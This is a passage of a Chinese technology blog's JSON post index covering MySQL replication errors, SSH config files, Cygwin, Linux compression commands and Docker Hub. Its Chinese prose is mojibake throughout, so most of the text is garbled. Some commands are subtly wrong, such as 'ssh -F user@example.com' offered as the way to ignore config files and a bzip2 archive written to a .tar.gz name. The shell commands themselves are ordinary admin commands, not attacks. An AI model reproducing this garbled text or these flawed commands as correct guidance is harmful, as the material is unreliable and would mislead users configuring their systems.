å¯èƒ½ä¼šé‡åˆ°çš„é—®é¢˜ Last_Errno: 1146 Last_Error: Error executing row event: â€˜Table â€˜panda.tâ€™ doesnâ€™t existâ€™ è§£å†³åŠæ³•ï¼šä½¿ç”¨slave-skip-errors å‚æ•°è·³è¿‡è¯¥é”™è¯¯ã€‚ 1234# vim &#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf[mysqld]slave_skip_errors&#x3D;1146 é‡å¯ä»åº“å³å¯ã€‚","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"äº†è§£ SSH Config","slug":"understand-ssh-config","date":"2020-09-02T15:58:02.000Z","updated":"2020-09-02T15:58:54.842Z","comments":true,"path":"understand-ssh-config/","link":"","permalink":"https://www.0x2beace.com/understand-ssh-config/","excerpt":"å¾ˆæ—©å°±æ¥è§¦åˆ°äº†SSHï¼Œèµ·åˆå¹¶ä¸çŸ¥é“æœ‰ssh configè¿™æ ·ä¸€ä¸ªä¸œè¥¿å­˜åœ¨ï¼ŒåŸºæœ¬ä¸Šæ˜¯æ‘¸ç€çŸ³å¤´è¿‡æ²³ï¼Œä¸­é—´é‡åˆ°è¿‡ä¸å°‘é—®é¢˜ï¼Œèµ°è¿‡ä¸å°‘å¼¯è·¯ã€‚ æœ€åæ€»ç»“å‡ºæ¥äº†ä¸¤ä¸ªè§£å†³åŠæ³•ï¼Œä»Šå¤©æ— æ„é—´å‘ç°åŸæ¥å…¶ä¸­æœ‰ä¸€ä¸ªè¿™ä¹ˆå¥½ç”¨çš„å·¥å…·ä¸€ç›´éƒ½è¢«æˆ‘å¿½ç•¥äº†ã€‚","text":"å¾ˆæ—©å°±æ¥è§¦åˆ°äº†SSHï¼Œèµ·åˆå¹¶ä¸çŸ¥é“æœ‰ssh configè¿™æ ·ä¸€ä¸ªä¸œè¥¿å­˜åœ¨ï¼ŒåŸºæœ¬ä¸Šæ˜¯æ‘¸ç€çŸ³å¤´è¿‡æ²³ï¼Œä¸­é—´é‡åˆ°è¿‡ä¸å°‘é—®é¢˜ï¼Œèµ°è¿‡ä¸å°‘å¼¯è·¯ã€‚ æœ€åæ€»ç»“å‡ºæ¥äº†ä¸¤ä¸ªè§£å†³åŠæ³•ï¼Œä»Šå¤©æ— æ„é—´å‘ç°åŸæ¥å…¶ä¸­æœ‰ä¸€ä¸ªè¿™ä¹ˆå¥½ç”¨çš„å·¥å…·ä¸€ç›´éƒ½è¢«æˆ‘å¿½ç•¥äº†ã€‚ ä»€ä¹ˆæ˜¯SSH Config å…ˆå†³æ¡ä»¶ï¼šåœ¨ä½¿ç”¨ssh ä¹‹å‰ï¼Œéœ€è¦å…ˆå®‰è£…å¥½Opensshã€SSH1æˆ–è€…æ˜¯SSH2ã€‚ï¼ˆLinuxã€Macç”¨æˆ·è¯·å¿½ç•¥ï¼‰ ~/.ssh/config æ˜¯é€šè¿‡ssh è¿æ¥è¿œç¨‹æœåŠ¡å™¨æ—¶ä½¿ç”¨çš„é…ç½®æ–‡ä»¶ã€‚ ä¸ºä»€ä¹ˆè¦ä½¿ç”¨SSH Configä¾‹å¦‚ï¼šä½¿ç”¨SSH è¿›è¡Œè¿œç¨‹è¿æ¥ï¼Œä¸€èˆ¬ä¼šè¿™æ ·åšï¼š 1$ ssh Boo@18.182.201.142 åœ¨ç®€å•åœ°è¿æ¥æƒ…å†µä¸‹ï¼Œå®ƒå¹¶ä¸éº»çƒ¦ã€‚ä½†æ˜¯å½“ç«¯å£å·ä¸æ˜¯é»˜è®¤å€¼ï¼ˆ22ï¼‰æ—¶ï¼Œå½“å¯†é’¥å¯¹ä¸æ˜¯é»˜è®¤åç§°æ—¶ï¼Œè¿æ¥å°±å˜å¾—å¤æ‚äº†ã€‚ 12345678# æŒ‡å®šç«¯å£è¿æ¥$ ssh Boo@18.182.201.142 -p 2222# éé»˜è®¤åç§°å¯†é’¥è®¤è¯$ ssh -i ~&#x2F;.ssh&#x2F;id_rsa_aliyun Boo@18.182.201.142# ä»¥ä¸Šä¸¤ç§æƒ…å†µç»¼åˆ$ ssh -i ~&#x2F;.ssh&#x2F;id_rsa_aliyun Boo@18.182.201.142 -p 2222 æ­¤æ—¶ï¼Œä½¿ç”¨ssh configå°±å˜å¾—å¾ˆæœ‰ç”¨äº†ã€‚ 123456# vim ~&#x2F;.ssh&#x2F;configHost aliyun HostName 18.182.201.142 Port 2222 User Boo IdentityFile ~&#x2F;.ssh&#x2F;id_rsa_aliyun ç°åœ¨åœ¨è¿æ¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š 1$ ssh aliyun æ˜¯ä¸æ˜¯éå¸¸çš„æ–¹ä¾¿ï¼å°±ç®—æ­¤æ—¶æ‰‹ä¸Šæœ‰å¤šå°æœåŠ¡å™¨éœ€è¦ç®¡ç†ï¼Œåªè¦é…ç½®å¥½å¯¹åº”çš„~/.ssh/configå‚æ•°ï¼Œå°±å¯ä»¥å¾ˆè½»æ¾çš„è¿›è¡Œè¿æ¥äº†ã€‚ ä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼šæœ‰å…³ssh çš„é…ç½®ä¸èƒ½åˆ†æˆå¤šä¸ªæ–‡ä»¶ï¼Œåªèƒ½å†™åœ¨è¿™ä¸€ä¸ªæ–‡ä»¶ä¸­~/.ssh/configï¼ˆå¦‚æœä½ æœ‰æ›´å¥½çš„åŠæ³•ï¼‰ã€‚ SSH çš„é…ç½®æ–‡ä»¶åŒæ ·é€‚ç”¨äºå…¶ä»–ç¨‹åºï¼Œå¦‚ï¼šscpï¼Œsftpç­‰ã€‚ å¸¸ç”¨çš„é…ç½®é€‰é¡¹é…ç½®æ–‡ä»¶æ ¼å¼ ç©ºè¡Œå’Œä»¥â€™ï¼ƒâ€™å¼€å¤´çš„è¡Œæ˜¯æ³¨é‡Šã€‚ æ¯è¡Œä»¥å…³é”®å­—å¼€å¤´ï¼Œåè·Ÿå‚æ•°ã€‚ é…ç½®é€‰é¡¹å¯ä»¥ç”¨ç©ºæ ¼æˆ–å¯é€‰çš„ç©ºæ ¼åˆ†éš”ï¼Œåªéœ€è¦ä¸€ä¸ª=ã€‚ å‚æ•°å¯ä»¥ç”¨åŒå¼•å·ï¼ˆâ€ï¼‰æ‹¬èµ·æ¥ï¼Œä»¥æŒ‡å®šåŒ…å«ç©ºæ ¼çš„å‚æ•°ã€‚ å¸¸ç”¨å…³é”®å­—SSH Config çš„å…³é”®å­—ä¸åŒºåˆ†å¤§å°å†™ï¼Œä½†æ˜¯å‚æ•°åŒºåˆ†å¤§å°å†™ã€‚ Hostï¼šå¯ä»¥ç†è§£ä¸ºè¿œç¨‹ä¸»æœºåçš„åˆ«åï¼Œæœ€ç»ˆæŒ‡æ˜è¿™ä¸ªåç§°è¿›è¡Œè¿æ¥ï¼Œå¦‚ï¼šssh aliyun HostNameï¼šéœ€è¦è¿œç¨‹è¿æ¥çš„ä¸»æœºåï¼Œé€šå¸¸éƒ½æ˜¯IPã€‚ Portï¼šæŒ‡å®šè¿æ¥ç«¯å£ Userï¼šæŒ‡å®šè¿æ¥ç”¨æˆ· IdentityFileï¼šæŒ‡æ˜è¿œç¨‹è¿æ¥å¯†é’¥æ–‡ä»¶ æ³¨ï¼šHost å…³é”®å­—å¯ä»¥åŒ…å«ä»¥ä¸‹æ¨¡å¼åŒ¹é…ï¼š *- åŒ¹é…é›¶ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ã€‚ä¾‹å¦‚ï¼ŒHost å°†åŒ¹é…æ‰€æœ‰ä¸»æœºï¼ŒåŒæ—¶`192.168.0.åŒ¹é…192.168.0.0/24`å­ç½‘ä¸­çš„æ‰€æœ‰ä¸»æœºã€‚ ? - æ°å¥½åŒ¹é…ä¸€ä¸ªå­—ç¬¦ã€‚è¯¥æ¨¡å¼Host 10.10.0.?å°†åŒ¹é…10.10.0.[0-9]èŒƒå›´å†…çš„æ‰€æœ‰ä¸»æœºã€‚ !- åœ¨æ¨¡å¼çš„å¼€å¤´å°†å¦å®šå…¶åŒ¹é…ä¾‹å¦‚ï¼ŒHost 10.10.0.* !10.10.0.5å°†åŒ¹é…10.10.0.0/24å­ç½‘ä¸­çš„ä»»ä½•ä¸»æœºï¼Œé™¤äº†10.10.0.5ã€‚ é…ç½®æ–‡ä»¶åŠ è½½é¡ºåº å…¨å±€é…ç½®æ–‡ä»¶ï¼š/etc/ssh/ssh_config ç”¨æˆ·é…ç½®æ–‡ä»¶ï¼š~/.ssh/config ssh å®¢æˆ·ç«¯æŒ‰ä»¥ä¸‹ä¼˜å…ˆé¡ºåºè¯»å–å…¶é…ç½®ï¼š ä»å‘½ä»¤è¡ŒæŒ‡å®šçš„é€‰é¡¹ ç”¨æˆ·çš„ssh é…ç½®æ–‡ä»¶ å…¨å±€çš„ssh é…ç½®æ–‡ä»¶ å¦‚æœå¸Œæœ›SSH å®¢æˆ·ç«¯å¿½ç•¥ssh é…ç½®æ–‡ä»¶ä¸­æŒ‡å®šçš„æ‰€æœ‰é€‰é¡¹ï¼Œå¯ä»¥ä½¿ç”¨ï¼š 1$ ssh -F user@example.com æ¢å¤è¿æ¥å¸¸ç”¨SSH çš„å°ä¼™ä¼´å¯èƒ½éƒ½çŸ¥é“ï¼Œä½¿ç”¨SSH è¿æ¥åˆ°è¿œç¨‹æœåŠ¡å™¨ä¹‹åï¼Œå¦‚æœä¸€æ®µæ—¶é—´æ²¡æœ‰è¾“å…¥ä»»ä½•æŒ‡ä»¤ï¼Œå¾ˆæœ‰å¯èƒ½ä¼šæ–­å¼€ä¸æœåŠ¡å™¨çš„è¿æ¥ï¼Œéœ€è¦é‡è¿å°±ä¼šå˜å¾—å¾ˆéº»çƒ¦ã€‚ æ­¤æ—¶ï¼Œssh config åˆå˜å¾—å¾ˆæœ‰ç”¨äº†ã€‚ 123456ï¼ƒå®šæœŸå‘æœåŠ¡å™¨å‘é€å®æ—¶æŠ¥å‘Šï¼ˆæ¯60ç§’ï¼Œå¯ä»¥è‡ªå®šä¹‰ï¼‰ServerAliveInterval 60# å¦‚æœæƒ³è¦é’ˆå¯¹æŸä¸ªè¿æ¥å•ç‹¬ä½¿ç”¨ï¼Œéœ€è¦æ”¾åœ¨Host æŒ‡ä»¤ä¸‹ï¼Œå…¨å±€åˆ™æ”¾åœ¨æœ€å¤´éƒ¨Host aliyun ServerAliveInterval 60 å¯èƒ½æ„Ÿå…´è¶£çš„å†…å®¹ å¦‚ä½•åœ¨Linux ä¸­æ›´æ”¹SSH ç«¯å£ å…³äº ~/.ssh/config ä½¿ç”¨ SSH é…ç½®æ–‡ä»¶ ssh_config æŒ‡ä»¤è¯¦è§£ SSH å®˜ç½‘ OpenSSH å®¢æˆ·ç«¯SSH é…ç½®æ–‡ä»¶","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"Cygwin å¿«é€Ÿä¸Šæ‰‹","slug":"cygwin-quick-start","date":"2020-09-01T14:16:25.000Z","updated":"2020-09-03T15:47:42.934Z","comments":true,"path":"cygwin-quick-start/","link":"","permalink":"https://www.0x2beace.com/cygwin-quick-start/","excerpt":"åœ¨å¾ˆæ—©ä¹‹å‰å°±å¬è¯´è¿‡Cygwinå’ŒMinGW64è¿™ä¸¤ä¸ªä¸œè¥¿ï¼Œåªæ˜¯å½“æ—¶ä¸æ˜¯å¾ˆç†è§£è¿™ä¸¤ä¸ªä¸œè¥¿æ˜¯åšä»€ä¹ˆçš„ï¼Œè¿˜ç»å¸¸å’ŒmsysGit ææ··æ·†ï¼ŒåŠ ä¸Šæœ€è¿‘ç”¨MinGW64ç”¨çš„å¾ˆä¸é¡ºæ‰‹ï¼Œæ‰€ä»¥æ‰“ç®—å®‰è£…ä¸€ä¸ªCygwinã€‚","text":"åœ¨å¾ˆæ—©ä¹‹å‰å°±å¬è¯´è¿‡Cygwinå’ŒMinGW64è¿™ä¸¤ä¸ªä¸œè¥¿ï¼Œåªæ˜¯å½“æ—¶ä¸æ˜¯å¾ˆç†è§£è¿™ä¸¤ä¸ªä¸œè¥¿æ˜¯åšä»€ä¹ˆçš„ï¼Œè¿˜ç»å¸¸å’ŒmsysGit ææ··æ·†ï¼ŒåŠ ä¸Šæœ€è¿‘ç”¨MinGW64ç”¨çš„å¾ˆä¸é¡ºæ‰‹ï¼Œæ‰€ä»¥æ‰“ç®—å®‰è£…ä¸€ä¸ªCygwinã€‚ åŒºåˆ«ä¸è”ç³»é¦–å…ˆæ¥ä»‹ç»ä¸‹è¿™ä¸‰è€…åˆ†åˆ«æ˜¯ä»€ä¹ˆã€‚ CygwinCygwinæ˜¯ä¸€ä¸ªç±»ä¼¼Unixçš„ç¯å¢ƒå’ŒMicrosoft Windowså‘½ä»¤è¡Œç•Œé¢ã€‚ å¤§é‡GNUå’Œå¼€æºå·¥å…·ï¼Œæä¾›ç±»ä¼¼äº Windowsä¸Šçš„ Linuxå‘è¡Œç‰ˆçš„åŠŸèƒ½ã€‚ç”¨å®˜ç½‘çš„è¯è¯´å°±æ˜¯ï¼šåœ¨Windows ä¸Šè·å–Linux çš„æ„Ÿè§‰ã€‚ MinGW64MSYS(MSYS | MinGW) æ˜¯ä¸€ä¸ªåœ¨ Windows ä¸‹çš„ç±»Unitå·¥ä½œç¯å¢ƒã€‚å› ä¸º Git é‡Œé¢åŒ…å«å¾ˆå¤š Shell è·Ÿ Perl è„šæœ¬ï¼Œæ‰€ä»¥å®ƒ(Git)éœ€è¦ä¸€ä¸ªè¿™æ ·çš„ç¯å¢ƒã€‚ æ¯æ¬¡å³é”®æ‰“å¼€Git Bashæ—¶ï¼Œå…¶ç»ˆç«¯å°±æ˜¯MinGW64 msysGitmsysGitæ˜¯ä¸€ä¸ªæ„å»ºç¯å¢ƒï¼Œå…¶ä¸­åŒ…å«å¸Œæœ›é€šè¿‡ä¸ºGit for Windowsç¼–å†™ä»£ç æ¥è´¡çŒ®æ‰€éœ€çš„æ‰€æœ‰å·¥å…·ã€‚ æ‰€ä»¥ï¼ŒGit for Windows å¯ä»¥åœ¨ Windows ä¸Šå®‰è£…å¯è¿è¡Œ Git çš„æœ€å°ç¯å¢ƒï¼Œè€Œ msysGit æ˜¯æ„å»º Git for Windows æ‰€éœ€çš„ç¯å¢ƒã€‚ å®‰è£…Cygwinå®‰è£…Cygwin çš„è¿‡ç¨‹æ¯”MinGW è¦å¤æ‚äº›ï¼Œå…¶ä¸­ä¸»è¦éœ€è¦æ³¨æ„çš„æ˜¯æ¨¡å—éƒ¨åˆ†ã€‚ Cygwin å¥½ç”¨çš„åŸå› å¾ˆå¤§ç¨‹åº¦ä¸Šæ˜¯å› ä¸ºå…¶åŠŸèƒ½ä¹‹ä¸°å¯Œï¼Œè€Œå„ç§åŠŸèƒ½åˆ™æ˜¯æ¥è‡ªäºå…¶æ¨¡å—ã€‚ ç»ˆäºå®‰è£…å¥½äº†ï¼Œæ„Ÿè§‰å¾ˆå‰å®³çš„æ ·å­ï¼Œæ˜¯æˆ‘æƒ³è¦çš„ä¸œè¥¿ï¼Œå¸Œæœ›åœ¨ä»Šåçš„æ—¥å­ä¸­ èƒ½å’Œå®ƒå¥½å¥½ç›¸å¤„ã€‚ Minttyæ˜¯ä¸€ä¸ªç»ˆç«¯ä»¿çœŸå™¨ ç”¨äºCygwinçš„ï¼Œ MSYSæˆ– Msys2 å’Œè¡ç”Ÿçš„é¡¹ç›®ï¼Œä»¥åŠç”¨äºWSLã€‚ å‚è€ƒé“¾æ¥ ä»Windows è¿è¡Œä¸‹è½½Cygwin64 Cygwin æ˜¯ä»€ä¹ˆï¼Œä¸æ˜¯ä»€ä¹ˆï¼Ÿâ€“å®˜ç½‘ Cygwin å®‰è£…æ•™ç¨‹ è¯¦ç»†","categories":[{"name":"ç»ˆç«¯","slug":"ç»ˆç«¯","permalink":"https://www.0x2beace.com/categories/%E7%BB%88%E7%AB%AF/"}],"tags":[{"name":"Cygwin","slug":"Cygwin","permalink":"https://www.0x2beace.com/tags/Cygwin/"},{"name":"ç»ˆç«¯","slug":"ç»ˆç«¯","permalink":"https://www.0x2beace.com/tags/%E7%BB%88%E7%AB%AF/"}]},{"title":"Linux å‹ç¼©ã€è§£å‹ã€æ‰“åŒ…è¯¦è§£","slug":"detailed-explanation-of-linux-compression-decompression-and-packaging","date":"2020-08-31T15:47:15.000Z","updated":"2020-09-17T12:51:47.804Z","comments":true,"path":"detailed-explanation-of-linux-compression-decompression-and-packaging/","link":"","permalink":"https://www.0x2beace.com/detailed-explanation-of-linux-compression-decompression-and-packaging/","excerpt":"åœ¨Linux ä¸­ï¼Œè§£å‹ã€å‹ç¼©ã€æ‰“åŒ…æ˜¯æ—¥å¸¸ä¼šå¾ˆé¢‘ç¹ç”¨åˆ°çš„å‡ ä¸ªæ“ä½œï¼Œä½†æ˜¯å› ä¸ºå‚æ•°å¾ˆå¤šï¼Œæ²¡æœ‰è®°å¿†ç‚¹ï¼ŒåŠ ä¸Šå‹ç¼©æ–‡ä»¶çš„ç±»å‹å¾ˆå¤šï¼Œå¦‚æœä¸ç»å¸¸ä½¿ç”¨ï¼Œæ˜¯çœŸçš„å®¹æ˜“å¿˜è®°ã€‚","text":"åœ¨Linux ä¸­ï¼Œè§£å‹ã€å‹ç¼©ã€æ‰“åŒ…æ˜¯æ—¥å¸¸ä¼šå¾ˆé¢‘ç¹ç”¨åˆ°çš„å‡ ä¸ªæ“ä½œï¼Œä½†æ˜¯å› ä¸ºå‚æ•°å¾ˆå¤šï¼Œæ²¡æœ‰è®°å¿†ç‚¹ï¼ŒåŠ ä¸Šå‹ç¼©æ–‡ä»¶çš„ç±»å‹å¾ˆå¤šï¼Œå¦‚æœä¸ç»å¸¸ä½¿ç”¨ï¼Œæ˜¯çœŸçš„å®¹æ˜“å¿˜è®°ã€‚ æ‰€ä»¥è¿™ç¯‡ç¬”è®°å°±æ˜¯ç”¨æ¥æ•´ç†å¸¸è§çš„é‚£äº›è§£å‹ã€å‹ç¼©ã€æ‰“åŒ…çš„å‘½ä»¤ã€‚ åœ¨æ­£å¼å­¦ä¹ ä¹‹å‰ï¼Œéœ€è¦æ˜ç¡®çš„ä¸¤ä¸ªæ¦‚å¿µï¼Œæ‰“åŒ…å’Œå‹ç¼©ä¸æ˜¯ä¸€å›äº‹ï¼š æ‰“åŒ…ï¼šæ˜¯æŒ‡å°†ä¸€å¤§å †æ–‡ä»¶æˆ–ç›®å½•å˜æˆä¸€ä¸ªæ€»çš„æ–‡ä»¶ã€‚ å‹ç¼©ï¼šåˆ™æ˜¯å°†ä¸€ä¸ªå¤§æ–‡ä»¶é€šè¿‡å‹ç¼©ç®—æ³•å˜æˆä¸€ä¸ªå°æ–‡ä»¶ã€‚ ä¸ºä»€ä¹ˆè¦åŒºåˆ†è¿™ä¸¤ä¸ªæ¦‚å¿µå‘¢ï¼Ÿè¿™æºäºLinux ä¸­å¾ˆå¤šå‹ç¼©ç¨‹åºåªèƒ½é’ˆå¯¹ä¸€ä¸ªæ–‡ä»¶è¿›è¡Œå‹ç¼©ï¼Œè¿™æ ·å½“ä½ æƒ³è¦å‹ç¼©ä¸€å¤§å †æ–‡ä»¶æ—¶ï¼Œä½ å¾—å…ˆå°†è¿™ä¸€å¤§å †æ–‡ä»¶å…ˆæ‰“æˆä¸€ä¸ªåŒ…ï¼ˆtarå‘½ä»¤ï¼‰ï¼Œç„¶åå†ç”¨å‹ç¼©ç¨‹åºè¿›è¡Œå‹ç¼©ï¼ˆgzip bzip2å‘½ä»¤ï¼‰ã€‚ tarå‹ç¼©/æ‰“åŒ…ä»…æ‰“åŒ…ï¼Œä¸å‹ç¼©ã€‚ 1tar -cvf foo.tar foo foo.tarè¿™ä¸ªæ–‡ä»¶åæ˜¯è‡ªå®šä¹‰çš„ï¼Œåªæ˜¯ä¹ æƒ¯ä¸Šæˆ‘ä»¬ä½¿ç”¨ .tar ä½œä¸ºåŒ…æ–‡ä»¶ã€‚ æ‰“åŒ…ï¼Œä¸”å‹ç¼©ã€‚-zå‚æ•°è¡¨ç¤ºä»¥ .tar.gz æˆ–è€… .tgz åç¼€åä»£è¡¨ gzip å‹ç¼©è¿‡çš„ tar åŒ…ã€‚ 1tar -zcvf foo.tar.gz foo æ‰“åŒ…ï¼Œä¸”å‹ç¼©ã€‚-j å‚æ•°è¡¨ç¤ºä»¥ .tar.bz2 åç¼€åä½œä¸ºtaråŒ…åã€‚ 1tar -jcvf foo.tar.gz foo è§£å‹åœ¨å½“å‰ç›®å½•ä¸‹ç›´æ¥è§£å‹ï¼š 1tar -zxvf foo.tar.gz æ³¨æ„ï¼Œå¦‚æœè¿™ä¸ªç›®å½•ä¸‹æœ‰åŒåçš„æ–‡ä»¶ï¼Œä¸ä¼šè¯¢é—®ï¼Œç›´æ¥è¦†ç›–ã€‚ è§£å‹è‡³æŒ‡å®šæ–‡ä»¶å¤¹ï¼š 1tar -zxvf foo.tar.gz -C &lt;dir name&gt; gzipgzip å‘½ä»¤ç”¨æ¥å‹ç¼©æ–‡ä»¶ã€‚æ–‡ä»¶ç»å®ƒå‹ç¼©è¿‡åï¼Œå…¶åç§°åé¢ä¼šå¤šå¤„ .gz æ‰©å±•åï¼ˆä¸å¸¦ .tarï¼‰ã€‚ å‹ç¼©å°†å½“å‰ç›®å½•çš„æ¯ä¸ªæ–‡ä»¶å‹ç¼©æˆ.gzæ–‡ä»¶ï¼š 1gzip * é€’å½’å‹ç¼©æŒ‡å®šç›®å½•çš„æ‰€æœ‰æ–‡ä»¶åŠå­ç›®å½•ï¼š 1gzip -r &lt;dir name&gt; è§£å‹è§£å‹å½“å‰ç›®å½•ä¸‹çš„foo.gz æ–‡ä»¶ï¼š 1gzip -d foo.gz è§£å‹å®Œæˆä¹‹åï¼Œfoo.gz å°±å˜æˆäº† foo æ–‡ä»¶ã€‚ é€’å½’è§£å‹ç›®å½•ï¼š 1gzip -dr &lt;dir name&gt; è§£å‹å®Œæˆä¹‹åï¼Œ&lt;dir name&gt; ç›®å½•ä¸‹çš„æ‰€æœ‰ .gz æ–‡ä»¶éƒ½ä¼šå˜æˆæ­£å¸¸æ–‡ä»¶ã€‚ zipzip å¯ä»¥ç”¨æ¥è§£å‹ç¼©æ–‡ä»¶ï¼Œæˆ–è€…å¯¹æ–‡ä»¶è¿›è¡Œæ‰“åŒ…æ“ä½œã€‚æ–‡ä»¶ç»å®ƒå‹ç¼©åä¼šå¦å¤–äº§ç”Ÿå…·æœ‰ .zip æ‰©å±•åçš„å‹ç¼©æ–‡ä»¶ã€‚ å‹ç¼©å°†å½“å‰ç›®å½•ä¸‹çš„æŒ‡å®šç›®å½•ï¼Œå‹ç¼©ä¸º .zipæ–‡ä»¶ï¼š 1zip -q -r foo.zip &lt;dir name&gt; å°†æŒ‡å®šç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶åŠå…¶æ–‡ä»¶å¤¹ï¼Œå‹ç¼©ä¸º.zip æ–‡ä»¶ï¼š 1zip -q -r foo.zip &#x2F;&lt;path to dir&gt; æ³¨æ„ï¼Œäº§ç”Ÿçš„å‹ç¼©æ–‡ä»¶åœ¨æ‰§è¡Œå‘½ä»¤çš„é‚£ä¸ªç›®å½•ä¸‹ã€‚ è§£å‹unzip å‘½ä»¤ç”¨äºè§£å‹ç¼©ç”± zip å‘½ä»¤å‹ç¼©çš„ .zipå‹ç¼©åŒ…ã€‚ æŸ¥çœ‹å‹ç¼©åŒ…å†…å®¹ï¼š 1unzip -v foo.zip å°†å‹ç¼©æ–‡ä»¶åœ¨æŒ‡å®šç›®å½•ä¸‹è§£å‹ç¼©ï¼Œå¦‚æœå·²æœ‰ç›¸åŒçš„æ–‡ä»¶å­˜åœ¨ï¼Œè¦æ±‚ unzipå‘½ä»¤ä¸è¦†ç›–åŸå…ˆçš„æ–‡ä»¶ã€‚ 1unzip -n foo.zip -d &#x2F;&lt;file to dir&gt; å°†å‹ç¼©æ–‡ä»¶åœ¨å½“å‰ç›®ä¸‹è§£å‹ï¼Œå¦‚æœå·²æœ‰ç›¸åŒçš„æ–‡ä»¶ï¼Œä¸è¯¢é—®ï¼Œç›´æ¥è¦†ç›–ã€‚ 1unzip -o foo.zip æ€»ç»“Linux ä¸‹çš„å‹ç¼©è§£å‹å…¶å®å¹¶ä¸å¤æ‚ï¼Œåªæ˜¯ä¸å¸¸ç”¨çš„æƒ…å†µä¸‹ï¼Œå¾ˆå®¹å™¨å¿˜è®°ã€‚ å¦‚æœä½ ä¸çŸ¥é“åœ¨ä»€ä¹ˆåœºæ™¯ä¸‹ï¼Œè¯¥ä½¿ç”¨ä»€ä¹ˆå‘½ä»¤ï¼Œå¯ä»¥å‚ç…§ï¼š å¦‚æœåªæœ‰ä¸€ä¸ªå¤§æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨ gzip æˆ–è€… zipå‘½ä»¤ã€‚ å¦‚æœæ˜¯ä¸€ä¸ªå®Œæ•´çš„ç›®å½•ï¼Œé‡Œé¢æœ‰å¾ˆå¤šå­ç›®å½•ä»¥åŠæ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨tarå‘½ä»¤ã€‚","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"Docker Hub å¿«é€Ÿä¸Šæ‰‹","slug":"docker-hub-quick-start","date":"2020-08-30T10:32:02.000Z","updated":"2020-08-30T10:35:11.952Z","comments":true,"path":"docker-hub-quick-start/","link":"","permalink":"https://www.0x2beace.com/docker-hub-quick-start/","excerpt":"æœ€è¿‘å°†å¸¸ä½¿ç”¨çš„é•œåƒæ”¾åœ¨äº†Docker ä»“åº“ï¼ˆDocker Hubï¼‰ä¸Šã€‚GitHub æ˜¯æ‰˜ç®¡ä»£ç çš„åœ°æ–¹ï¼Œè€ŒDocker Hub åˆ™æ˜¯æ‰˜ç®¡é•œåƒçš„åœ°æ–¹ã€‚","text":"æœ€è¿‘å°†å¸¸ä½¿ç”¨çš„é•œåƒæ”¾åœ¨äº†Docker ä»“åº“ï¼ˆDocker Hubï¼‰ä¸Šã€‚GitHub æ˜¯æ‰˜ç®¡ä»£ç çš„åœ°æ–¹ï¼Œè€ŒDocker Hub åˆ™æ˜¯æ‰˜ç®¡é•œåƒçš„åœ°æ–¹ã€‚ ç›®å‰å¤§éƒ¨åˆ†éœ€æ±‚éƒ½å¯ä»¥ç›´æ¥åœ¨ Docker Hub ä¸­ä¸‹è½½é•œåƒæ¥å®ç°ï¼Œå¦‚æœæƒ³ä½¿ç”¨è‡ªå·±ä»“åº“ä¸­çš„é•œåƒï¼Œé‚£ä¹ˆéœ€è¦å…ˆæ³¨å†Œä¸€ä¸ªè´¦å·ã€‚ åˆ›å»ºä»“åº“æƒ³è¦ä» Docker Hub ä½¿ç”¨è‡ªå·±çš„é•œåƒä¹‹å‰ï¼Œé¦–å…ˆå¾—åˆ›å»ºä¸€ä¸ªä»“åº“ï¼Œç„¶åå°†ç›®æ ‡é•œé•œåƒ push åˆ°è¯¥ä»“åº“ã€‚ è¿™ä¸ªä»“åº“å¯ä»¥æ˜¯å…¬å¼€çš„ä¹Ÿå¯ä»¥æ˜¯ç§æœ‰çš„ï¼Œè¿™ä¸ªå¹¶ä¸å½±å“ä½ æ­£å¸¸ä½¿ç”¨ã€‚ åˆ›å»ºæˆåŠŸä¹‹åï¼Œå°±å¯ä»¥çœ‹åˆ°è¯¥ä»“åº“äº†ã€‚ å‘å¸ƒé•œåƒåœ¨å‘å¸ƒä¹‹å‰ï¼Œç¡®ä¿ä½ æœ¬åœ°å­˜åœ¨ç›®æ ‡é•œåƒï¼Œå¯ä»¥ä½¿ç”¨ docker imagesæ¥æŸ¥çœ‹ï¼š 123$ docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEadminer latest c3588b6003bb 3 weeks ago 90.4MB åˆ›å»º Tagï¼š 12345# è¯­æ³•docker tag local-image:tagname new-repo:tagname# å®ä¾‹docker tag adminer:latest hoooliday&#x2F;runfast:adminer å‰é¢çš„ tagname æ˜¯æœ¬åœ°é•œåƒçš„æ ‡ç­¾åç§°ï¼Œåé¢çš„tagname æ˜¯è¯¥é•œåƒåœ¨ä»“åº“ä¸­çš„æ ‡ç­¾åç§°ã€‚ å†æ¬¡æŸ¥çœ‹æœ¬åœ°é•œåƒï¼š 123$ docker imageshoooliday&#x2F;runfast adminer c3588b6003bb 3 weeks ago 90.4MBadminer latest c3588b6003bb 3 weeks ago 90.4MB å‘å¸ƒé•œåƒï¼š 12345# è¯­æ³•docker push new-repo:tagname# å®ä¾‹docker push hoooliday&#x2F;runfast:adminer å‘å¸ƒæˆåŠŸä¹‹åï¼Œå¯ä»¥æ‰“å¼€ Docker Hub åœ¨ Repositories çš„åˆ—è¡¨ä¸­å°±çœ‹åˆ°åˆšæ‰çš„é•œåƒäº†ã€‚ æ‹‰å–é•œåƒé¦–å…ˆéœ€è¦åœ¨å‘½ä»¤è¡Œä¸­ç™»å½•ä½ çš„ docker hub è´¦å·ï¼š 1$ docker login æ‹‰å–è‡ªå·±çš„é•œåƒï¼Œè¿™é‡Œä»¥ adminer è¿™ä¸ªé•œåƒä¸ºä¾‹ï¼š 1234docker run --link mysql:mysql --name adminer \\-d --restart&#x3D;always \\-p 8006:8080 \\hoooliday&#x2F;runfast:adminer 